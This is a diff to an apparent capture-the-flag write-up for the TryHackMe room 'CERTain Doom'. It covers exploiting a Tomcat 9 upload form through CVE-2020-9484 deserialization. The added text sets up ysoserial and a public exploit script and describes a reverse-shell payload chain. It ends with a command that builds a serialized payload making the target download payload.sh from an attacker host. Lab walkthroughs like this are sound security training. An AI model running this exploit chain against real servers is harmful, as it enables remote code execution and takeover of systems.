@@ -25,7 +25,7 @@ Access this hard-level CTF clicking <a href="https://tryhackme.com/room/certaind
 <code>No answer needed</code></p>
 
 <br>
-<h2>Task 2 . Flags</h2>
+<h2>Task 2 . Flagz</h2>
 <p>There's no way in, or is there?</p>
 
 <p><em>Answer the questions below</em></p>
@@ -166,12 +166,24 @@ reports                 [Status: 302, Size: 0, Words: 1, Lines: 1]
 <p>
 
 - Internal Information Security team = Hydra´s Head CERT<br>
-- Company = Hydra´s Head COnsulting Girm<br>
-- <code>File Upload Form</code> to browse and upload vulnerabilities in PDF format<br>
-- upload a <code>Test.txt</code> containing <code>Hello</code><br>
-- used <code>Burp Suite</code> with <code>Foxy Proxy</code> to intercept it<br>
-- sent the <code>Request</code> to Burp´s <code>Repater</code>
-- file with format different than PDF can be uploaded<br></p>
+- Company = Hydra´s Head Consulting Firm<br>
+- <code>File Upload Form</code> to browse and upload vulnerabilities in PDF format<br><br>
+- uploaded a <code>Test.txt</code> containing <code>Hello</code><br>
+- used <code>Burp Suite</code> with <code>Foxy Proxy</code> to intercept<br>
+- <code>Test.txt</code> was uploaded in<code>/usr/tomcat/temp/uploads/<code>Test.tct</code><br>
+- noticed that file with format different than PDF can be uploaded<br>
+- identified <code>Tomcat</code> version <code>9</code><br><br>
+- searched for <code> GitHub Apache Tomcat 9 exploit</code><br>
+- identified <code>Remote Code Execution Exploit in Apache Tomcat 9.0.27</code>, <code>CVE-2020-9484</code><br>
+- navigated to <a href="https://github.com/PenTestical/CVE-2020-9484">PenTestical</a><br>
+- the vulnerability exists due to <code>insecure input validation</code> when processing <code>serialized data in uploaded files names</code> i.e. it don´t validate wich file is uploaded<br>
+- <code>ysoserial</code> is needed to execute the script <code>CVE-2020-9484.sh</code><br>This script creates four files: -- a reverse shell <code>payload.sh</code>,<br>-- and 3 serialized payloads <code>downloadPayload.session</code>,<br> -- a payload with 777 permission  <code>chmodPayload.session</code> and<br>-- an execution payload<code>executePayload.session</code><br>With a netcat session and a http server set up the script uploads and triggers each one of the serialized payloads.<br><br>
+- proceeded installing <code>ysoserial</code><br>
+
+
+- sent the <code>Request</code> to Burp´s <code>Repeater</code><br><br>
+
+</p>
 
 
 <div align="left">
@@ -181,6 +193,81 @@ reports                 [Status: 302, Size: 0, Words: 1, Lines: 1]
 |<img width="400px" src="https://github.com/user-attachments/assets/7c079b1a-7fa9-4ade-9565-1f55cda42c48">|<img width="400px" src="https://github.com/user-attachments/assets/7c079b1a-7fa9-4ade-9565-1f55cda42c48">|
 
 </div>
+
+<h2>yososerial</h2>
+
+- navigated to <a href="https://github.com/frohoff/ysoserial">ysoserial</a><br>
+- clicked <code>Releases</code><br>
+- downloaded <a href="https://github.com/frohoff/ysoserial/releases/download/v0.0.6/ysoserial-all.jar">ysoserial-all.jar</a><br>
+<h3><code>git</code> and <code>maven</code></h3>
+
+```bash
+:~/CERTainDoom# sudo apt update
+```
+
+```bash
+:~/CERTainDoom# sudo apt install git maven -y
+```
+
+<h3>Cloned <code>ysoserial</code> repository</h3>
+
+```bash
+:~/CERTainDoom# git clone https://github.com/frohoff/ysoserial.git
+```
+
+```bash
+:~/CERTainDoom# cd ysoserial
+```
+
+<h3>Built</h3>
+
+```bash
+:~/CERTainDoom# mvn clean package -DskipTests
+```
+
+<h3>Built <code>jar</code> in the working path</h3>
+
+```bash
+:~/CERTainDoom# cp target/ysoserial-*.jar ~/CERTainDoom/ysoserial-all.jar
+```
+
+```bash
+:~/CERTainDoom# cd ~/CERTainDoom
+```
+
+<h3>File type</h3>
+
+```bash
+:~/CERTainDoom# file ysoserial-all.jar
+ysoserial-all.jar: Zip archive data, at least v1.0 to extract
+```
+
+<h2>CVE-2020-9484</h2>
+<h3>Requirements</h3>
+
+```bash
+:~/CERTainDoom# cd /opt && git clone https://github.com/frohoff/ysoserial
+```
+
+```bash
+:~/CERTainDoom#  cd /opt/ysoserial && wget https://jitpack.io/com/github/frohoff/ysoserial/master-SNAPSHOT/ysoserial-master-SNAPSHOT.jar -O ysoserial-master.jar
+```
+
+<h3>Install</h3>
+
+```bash
+cd /opt && git clone https://github.com/PenTestical/CVE-2020-9484 && cd CVE-2020-9484/ && chmod +x CVE-2020-9484.sh
+```
+
+<h3>Help</h3>
+
+```bash
+./CVE-2020-9484.sh -h
+```
+
+```bash
+:~/CERTainDoom# PATH=/usr/lib/jvm/java-11-openjdk-amd64/bin:$PATH java -jar ysoserial-all.jar CommonsCollections2 'curl http://xx.xxx.xx.xx/payload.sh -o /usr/local/tomcat/temp/uploads/payload.sh' > downloadPayload.session
+```
 
 
 </p>
